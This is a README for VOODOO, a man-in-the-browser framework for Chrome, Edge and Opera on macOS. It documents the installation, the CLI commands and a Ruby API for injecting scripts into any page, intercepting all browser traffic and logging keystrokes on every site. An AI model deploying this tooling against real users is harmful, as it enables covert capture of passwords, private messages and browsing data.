# VOODOO
Man in the Browser Framework

<p align="center">
    <br />
    <img src="./.github/voodoo.svg" width="50%" />
</p>

## Browser Support

| [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/edge/edge_48x48.png" alt="IE / Edge" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Edge | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/chrome/chrome_48x48.png" alt="Chrome" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Chrome | [<img src="https://raw.githubusercontent.com/alrra/browser-logos/master/src/opera/opera_48x48.png" alt="Opera" width="24px" height="24px" />](http://godban.github.io/browsers-support-badges/)<br/>Opera |
| --------- | --------- | --------- |
| macOS only | macOS only | macOS only

## Features
* 📜 Content Scripts - inject arbitrary JavaScript to any page
* 🔍 Interceptor - capture browser traffic (url, headers, body, etc)
* 🔑 Keylogger - records user keystrokes on any site

## Requirements
* ruby >= 2.0.0
* rubygems >= 1.8
* thor ~> 1.2.1
* bundler >= 1.17

## Installation
```sh
$: git clone https://github.com/breakpointHQ/VOODOO.git
$: cd VOODOO
$: bundle install
$: ./scripts/install.sh
```

If you don't have the `/Users/[user]/.gem/ruby/[version]/bin` in your `PATH`, add it.

## CLI

```sh
$: voodoo
Commands:
  voodoo help [COMMAND]    # Describe available commands or one specific command
  voodoo intercept         # intercept browser requests
  voodoo keylogger         # records user keystrokes
  voodoo script <js/path>  # add a content script
  voodoo version           # Prints voodoo version
```

```sh
$: voodoo help script
Usage:
  voodoo script <js/path>

Options:
  s, [--site=SITE]              
  m, [--matches=one two three]  
                                # Default: ["*://*/*"]
  b, [--browser=BROWSER]        
                                # Default: chrome

add a content script
```

## Ruby API

```rb
require 'voodoo'

browser = VOODOO::Browser.Chrome
                       # .Opera
                       # .Edge

# Intercept all browser requests
browser.intercept do |req|
    puts "#{req[:method]} #{req[:url]}"
end

# Inject keylogger to every page
browser.keylogger do |event|
    print event[:log]
end

browser.hijack 'https://example.com'
```

